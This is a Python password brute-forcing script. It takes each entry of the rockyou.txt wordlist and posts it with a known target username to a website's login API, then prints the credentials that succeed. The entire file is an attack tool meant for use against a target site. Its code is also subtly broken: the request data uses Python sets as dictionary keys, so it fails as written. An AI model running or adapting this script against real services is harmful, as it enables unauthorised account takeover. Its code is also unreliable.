#import chardet
import requests

#Change API endpoint, username id, password id, 
#username text, password text, and wordlist path
api_endpoint = 'http://localhost:3000/api/login' #get api from target website'   
username_id = 'username' #get username id from target website' 
password_id = 'password' #get password id from target website'
username_text = 'nadech' #enter known target username or email
wordlist_path = 'rockyou.txt' #/usr/share/wordlists/rockyou.txt

#Open wordlist file
# with open(wordlist_path, "rb") as passwords_file:
#     rawdata = passwords_file.read()
#     result = chardet.detect(rawdata)
#     encoding = result['encoding']
# with open(wordlist_path, "r", encoding=encoding) as passwords_file:
#     passwords = passwords_file.read().splitlines()   
with open(wordlist_path, "rb") as passwords_file:
    passwords = passwords_file.read().splitlines()

#Call API to check any passwords
for password_text in passwords:            
    response = requests.post(api_endpoint, 
               data={{username_id}: username_text, 
                     {password_id}: password_text})
    if response.json()['status'] == True:
        print(f'{username_id}: {username_text}')
        print(f'{password_id}: {password_text}')
        break   

